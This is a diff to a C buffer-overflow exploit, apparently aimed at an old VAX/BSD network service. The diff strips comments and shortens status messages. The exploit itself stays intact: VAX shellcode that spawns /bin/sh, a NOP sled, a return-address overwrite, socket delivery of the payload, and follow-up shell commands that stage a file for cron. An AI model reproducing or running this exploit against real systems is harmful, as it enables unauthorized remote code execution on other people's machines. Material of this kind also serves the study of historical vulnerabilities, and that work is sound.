@@ -13,10 +13,8 @@
 #define PATIENCE 3
 #define IO_BUF_SIZE 2048
 
-/* The Shellcode (VAX OpCodes) */
 #define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
 
-/* K&R Style function definitions */
 create_exploit(buf, shellcode, buf_size, shellcode_len)
     char *buf;
     char *shellcode;
@@ -26,17 +24,14 @@ create_exploit(buf, shellcode, buf_size, shellcode_len)
     int i;
 	int j;
 
-    /* Fill with NOPs */
     for (i = 0; i < buf_size; i++) buf[i] = NOP;
     
-    /* Insert shellcode at offset 300 */
     for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];
 
 	for (i = buf_size - 4*4 - 4; i < buf_size - 4; i ++) { 
 		buf[i] = 0x00; 
 	}
 
-    /* Overwrite the return address area (approx 0x7ffeea38) */
     for (i = buf_size - 4; i < buf_size; i += 4) {
         buf[i]   = 0x38; 
         buf[i+1] = 0xea;
@@ -58,7 +53,7 @@ read_from_sock(sock, io_buf, buf_size)
 	num_tries = 0;
 
     while (num_tries < PATIENCE) {
-        readfds = (1 << sock); /* Manual bitmask for old BSD select */
+        readfds = (1 << sock); 
         tv.tv_sec = 1;
         tv.tv_usec = 0;
 
@@ -117,9 +112,8 @@ main()
         exit(1);
     }
 
-    /* Send the buffer overflow payload */
     write(sock, buf, BUF_SIZE);
-    printf("Payload delivered. Waiting for shell...\n");
+    printf("Payload delivered!\n");
     sleep(1);
 
 	write_to_sock(sock, echo_command);
@@ -151,8 +145,6 @@ main()
 	write_to_sock(sock, touch_file); 
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
 
-    printf("Exploit staged. You must wait for cron to run (up to 60s).\n");
-    
     close(sock);
     exit(0);
 }
